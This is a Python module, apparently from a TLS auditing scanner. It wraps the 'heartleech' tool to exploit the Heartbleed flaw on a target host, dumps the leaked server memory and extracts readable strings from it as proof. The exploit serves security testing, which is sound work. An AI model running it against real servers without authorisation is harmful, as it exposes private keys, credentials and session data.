import subprocess, os, time
from idontspeakssl.common.utils import get_resource_path
import string

class HeartbleedPoC():

	def create_output_folder(target, report_folder):
		output_folder = '{}/output'.format(report_folder)
		if(not os.path.exists(output_folder)):
			os.mkdir(output_folder)
		host_folder = output_folder + "/" + target
		if(not os.path.exists(host_folder)):
			os.mkdir(host_folder)
		return host_folder

	def exploit_heartbleed(target, host_folder):
		target = target.replace('_', ":")
		heartleech_path = get_resource_path('heartleech')
		poc_file_path = host_folder + "/heartbleed_poc.bin"
		exploit_process = subprocess.Popen([heartleech_path, target,
			'--dump', poc_file_path],
			stdout=subprocess.PIPE,
			stderr=subprocess.STDOUT)
		time.sleep(10)
		exploit_process.kill()
		stdout,stderr = exploit_process.communicate()
		return stdout, poc_file_path


	# https://stackoverflow.com/questions/17195924/python-equivalent-of-unix-strings-utility
	def strings(filename, min=10):
		with open(filename, errors="ignore") as f:
			result = ""
			for c in f.read():
				if c in string.printable:
					result += c
					continue
				if len(result) >= min:
					yield result
				result = ""
			if len(result) >= min:
				yield result

	@classmethod
	def heartbleed_demo(cls, target, report_folder):
		host_folder = cls.create_output_folder(target, report_folder)
		stdout, poc_file_path = cls.exploit_heartbleed(target, host_folder)
		# keeping only the first 10 element of the list, could be enhanced but that's just a scanner
		strings_output_list = list(cls.strings(poc_file_path))[:10]
		if(strings_output_list):
			return {'heartleech_output':stdout,
				'strings_output_list':strings_output_list}
		else:
			return {}
